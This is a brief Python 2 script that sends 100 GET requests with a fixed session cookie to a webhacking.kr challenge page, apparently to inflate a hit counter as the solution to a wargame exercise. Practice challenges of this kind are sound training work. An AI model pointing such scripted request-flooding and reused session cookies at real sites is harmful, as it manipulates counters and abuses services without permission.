import urllib
import httplib
import hashlib

for i in range(1,101):
    HTTP=httplib.HTTPConnection("webhacking.kr")
    Param=urllib.urlencode({})
    Headers={"Content-Type":"Application/x-www-form-urlencode",
             "Cookie":"PHPSESSID=af805d0d3306b50b45f162fc422f2545;"}
    HTTP.request("GET","/challenge/codeing/code5.html?hit=st4rburst",Param,Headers)
    Result=HTTP.getresponse().read()
    print str(i)
